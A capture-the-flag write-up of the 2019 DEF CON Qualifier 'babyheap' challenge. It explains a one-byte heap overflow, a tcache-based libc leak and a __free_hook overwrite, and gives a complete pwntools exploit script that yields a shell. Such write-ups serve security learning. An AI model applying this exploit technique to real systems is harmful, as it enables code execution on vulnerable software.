---
layout: post
cover: 'assets/images/cover8.jpg'
navigation: true
title: '2019 DEF CON QUAL - babyheap'
date: 2019-05-29
tags: pwnable writeup
subclass: 'post'
logo: 'assets/images/ghost.png'
author: lanphere
categories: lanphere
disqus: true
---

I solved this challenge after CTF. So interesting.
I realized a new heap exploit technique via this challenge.

### Challenge

```
-----Yet Another Babyheap!-----
[M]alloc 
[F]ree 
[S]how 
[E]xit 
------------------------
Command:
> 
```

Seems like common heap challenge. We can allocate up to 10 chunks.
If input size for allocation is between 0 and 248(0xf8), malloc(0xf8).
If input is between 249 and 376(0x178), malloc(0x178).

### Vulnearbility

```
read(0, &buf, 1uLL);
size = (unsigned int)size;
cur_len = 0LL;
v4 = &chunks[2 * i];
// 1byte overflow
while ( buf != '\n' && buf )
{
  *(_BYTE *)(*v4 + cur_len) = buf;
  read(0, &buf, 1uLL);
  if ( size == cur_len )
    return 0LL;
  ++cur_len;
}
```

The vulnerability is that there is one-byte overflow getting input. So we can overwrite the lower one byte of size field of adjacent chunk.

The overall idea is as follows. 
1. There are three chunks. Size field of second chunk should be 0x101(chunks that are allocated with malloc(0xf8)).
2. Then free the first chunk and allocate with the same size, and overwrite size filed of second chunk with 0x181(size same as the size of chunk via malloc(0x178)).
3. Free the second chunk and allocate again. then we can overwrite large part of third chunk.

The reason that this vulnerability is possible is that this challenge uses glibc version of 2.29, which uses tcache, and tcache doesn't check the next chunk of to-be-freed chunk.

### Libc Leak

To leak base address of libc, the scenario is as follows.
1. allocate two chunks. Size of second chunk shoud be 0x101.
2. allocate 7 chunks whose size are 0x181.
3. free chunks whose indexes are between 3 and 9.(tcache becomes saturated with 7 chunks)
4. free second chunk. this freed chunk goes in unsorted bin
5. allocate a 0x178-size chunk. then third chunk is overwritten with size field of 0x80 and fd value of libc address. (pointer of third chunk is not deleted)

### Exploit

After libc leak, the rest is easy. Again using the idea explained above, this time we overwrite fd value of adjacent chunk with address of __free_hook,
and overwrite __free_hook with address of one gadget.

```
from pwn import *

bin = ELF('./babyheap')
libc = ELF('./libc.so', checksec=False)

context.log_level = 'debug'

one_gadget_offset = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]


def malloc(size, content):
    conn.sendafter('Command:\n> ', 'M')
    conn.sendafter('Size:\n> ', str(size))
    conn.sendafter('Content:\n> ', content)


def free(idx):
    conn.sendafter('> ', 'F')
    conn.sendafter('> ', str(idx))


def show(idx):
    conn.sendafter('> ', 'S')
    conn.sendafter('> ', str(idx))


conn = process('./babyheap', env={'LD_PRELOAD': './libc.so'})
# gdb.attach(conn, '')

# Libc Leak
malloc(0xf8, 'AAAAAAA\n')
malloc(0xf8, 'BBBBBBB\n')
for i in range(8):
    malloc(0x178, 'AAAAAAAABBBBBBBB' * 7 +
           'CCCCCCCC' + '\x01\x01\x00')  # 2 ~ 9

for i in range(3, 10):
    free(i)

free(0)
malloc(0xf8, 'AAAAAAAA' * 2 * 0xf + 'BBBBBBBB' + '\x81\n')
free(1)
malloc(0xf8, 'DDDDDDD\n')

show(2)
libc_addr = u64(conn.recv(6) + '\x00\x00') - 0x1e4ca0
log.info('Libc_addr: ' + hex(libc_addr))

"""
Current State
idx 0: chunk(0xf8)
idx 1: chunk(0xf8)
idx 2: chunk(0x80)
idx 3: NULL

bin: tcache bin of chunk size 0x181 saturated
"""
malloc(0x178, 'EEEEEEE\n')  # 3rd
malloc(0x178, 'FFFFFFF\n')  # 4th
malloc(0xf8, 'GGGGGGG\n')  # 5th
malloc(0xf8, 'HHHHHHH\n')  # 6th
malloc(0xf8, 'IIIIIII\n')  # 7th

free(6)
malloc(0xf8, 'JJJJJJJJ' * 2 * 0xf + 'BBBBBBBB' + '\x81\n')
free(7)

free(5)
malloc(0xf8, 'KKKKKKKK' * 2 * 0xf + 'BBBBBBBB' + '\x81\n')
free(6)

p = 'LLLLLLLL'*2*0xf + 'BBBBBBBB'*2
p += p64(libc_addr + libc.symbols['__free_hook'])[:-1]

malloc(0x178, p)
malloc(0x178, 'MMMMMMM\n')
malloc(0x178, p64(libc_addr + one_gadget_offset[1])[:-1])

free(0)

conn.interactive()
```